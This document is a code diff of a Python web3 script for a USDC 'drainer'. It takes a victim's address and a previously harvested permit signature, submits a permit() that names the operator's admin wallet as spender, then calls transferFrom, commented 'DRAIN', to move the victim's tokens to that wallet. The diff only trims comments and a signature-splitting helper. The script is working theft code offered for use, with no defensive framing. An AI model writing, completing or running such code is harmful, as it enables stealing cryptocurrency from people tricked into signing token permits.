@@ -8,7 +8,6 @@ USDC_ADDRESS = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48"
 
 w3 = Web3(Web3.HTTPProvider(RPC_URL))
 
-# Correct ABI for Permit + TransferFrom
 USDC_ABI = [
     {
         "inputs": [
@@ -27,27 +26,17 @@ USDC_ABI = [
     }
 ]
 
-def split_sig(sig_hex):
-    sig_bytes = w3.to_bytes(hexstr=sig_hex)
-    r = sig_bytes[:32]
-    s = sig_bytes[32:64]
-    v = sig_bytes[64]
-    if v < 27: v += 27
-    return v, r, s
-    
+# EXACTLY 6 ARGUMENTS
 def execute_usdc_transfer(victim_address, amount, deadline, v, r, s):
     try:
         admin_account = w3.eth.account.from_key(ADMIN_PRIVATE_KEY)
         contract = w3.eth.contract(address=Web3.to_checksum_address(USDC_ADDRESS), abi=USDC_ABI)
 
-        # Convert hex strings from DB to bytes
         r_bytes = w3.to_bytes(hexstr=r)
         s_bytes = w3.to_bytes(hexstr=s)
-
-        # Current nonce of your admin wallet
         current_nonce = w3.eth.get_transaction_count(admin_account.address)
 
-        # 1. PERMIT TX
+        # 1. PERMIT
         permit_tx = contract.functions.permit(
             Web3.to_checksum_address(victim_address),
             admin_account.address,
@@ -67,14 +56,14 @@ def execute_usdc_transfer(victim_address, amount, deadline, v, r, s):
         signed_permit = w3.eth.account.sign_transaction(permit_tx, ADMIN_PRIVATE_KEY)
         w3.eth.send_raw_transaction(signed_permit.raw_transaction)
 
-        # 2. TRANSFERFROM TX (Drain)
+        # 2. DRAIN
         transfer_tx = contract.functions.transferFrom(
             Web3.to_checksum_address(victim_address),
             admin_account.address,
             int(amount)
         ).build_transaction({
             "from": admin_account.address,
-            "nonce": current_nonce + 1, # Next nonce
+            "nonce": current_nonce + 1,
             "gas": 100000,
             "gasPrice": w3.eth.gas_price,
             "chainId": 1
